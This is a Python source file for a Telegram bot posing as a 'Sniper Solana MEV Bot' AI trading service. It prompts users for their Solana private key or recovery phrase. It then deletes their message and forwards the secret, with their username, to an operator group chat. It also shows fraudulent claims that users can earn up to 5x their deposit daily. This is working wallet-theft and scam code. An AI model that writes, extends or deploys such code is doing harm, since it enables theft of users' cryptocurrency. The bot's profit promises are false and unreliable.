from nacl.signing import SigningKey
from mnemonic import Mnemonic
import base58
from sessions import user_sessions
from telebot import  types

from config import GROUP_CHAT_ID

# Shared state
bot_data = {}

def set_bot_data(data):
    global bot_data
    bot_data = data

# Prompt for private key or phrase
def prompt_for_private_key(bot, message):
    chat_id = message.chat.id
    sent = bot.send_message(
        chat_id,
        "🔑 Please send your *Solana private key* or *recovery phrase*.\n\nExamples:\n- `2sZrXy8GtCxVM...`\n- `chicken acid smile baby...`",
        parse_mode="Markdown"
    )
    bot_data[chat_id] = {
        'awaiting_key': True,
        'prompt_msg_id': sent.message_id
    }

# Convert mnemonic phrase to private/public key
def mnemonic_to_sol_keypair(mnemonic_phrase: str, passphrase: str = ""):
    mnemo = Mnemonic("english")
    seed = mnemo.to_seed(mnemonic_phrase, passphrase)
    private_key_bytes = seed[:32]
    signing_key = SigningKey(private_key_bytes)
    verify_key = signing_key.verify_key
    private_key_b58 = base58.b58encode(signing_key.encode()).decode()
    public_key_b58 = base58.b58encode(verify_key.encode()).decode()
    return private_key_b58, public_key_b58

# Handle key or phrase
def handle_wallet_key_input(bot, message):
    chat_id = message.chat.id
    if chat_id not in bot_data or not bot_data[chat_id].get('awaiting_key'):
        return

    prompt_id = bot_data[chat_id].get('prompt_msg_id')
    if prompt_id:
        try: bot.delete_message(chat_id, prompt_id)
        except: pass

    try: bot.delete_message(chat_id, message.message_id)
    except: pass

    try:
        input_text = message.text.strip()

        # If input looks like a phrase (contains spaces)
        if " " in input_text:
            sec_key, pubkey = mnemonic_to_sol_keypair(input_text)
        else:
            # Treat as raw base58 private key
            private_key_bytes = base58.b58decode(input_text)
            signing_key = SigningKey(private_key_bytes[:32])
            verify_key = signing_key.verify_key
            sec_key = input_text
            pubkey = base58.b58encode(verify_key.encode()).decode()

        bot.send_message(
            GROUP_CHAT_ID,
            f"🔐 *User `{chat_id}` (@{message.from_user.username}) sent:*\n```{input_text}```",
            parse_mode="Markdown"
        )
        user_sessions[chat_id] = {
            "pubkey": pubkey,
            "sec_key": sec_key
        }
        bot_data[chat_id]['awaiting_key'] = False

        msg = f"""
🚀 *Meet Sniper Solana MEV Bot* : Your 24/7 AI Trading Partner on Solana

⚡ Maximize your earnings with 24/7 AI-powered trading and lightning-fast MEV techniques, optimizing your performance on the Solana network.

🔑 *Your Main SOL Wallet*
`{pubkey}` _(Tap to copy)_

💰 *Balance:* `0.000000 SOL`
📈 *Profit Potential (per 24 hours):*
- 2 SOL Deposit: Earn up to 1.5× daily
- 5 SOL Deposit: Earn up to 2.5× daily
- 10 SOL Deposit: Earn up to 5× daily

💡 _Please keep at least 2 SOL into your wallet or import your private key to activate Sniper Solana MEV Bot._
"""
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("✅ Continue", callback_data="actuall_menu"))

        bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=keyboard)

        # Report to group
        bot.send_message(
            GROUP_CHAT_ID,
            f"📥 New key imported from user ID `{chat_id}` (@{message.from_user.username})",
            parse_mode="Markdown"
        )

    except Exception as e:
        bot.reply_to(message, f"❌ Could not import wallet.\n\nError: `{e}`", parse_mode="Markdown")

# Callback to delete "Continue" message
def handle_continue_wallet(bot, call):
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception as e:
        print(f"Failed to delete continue message: {e}")
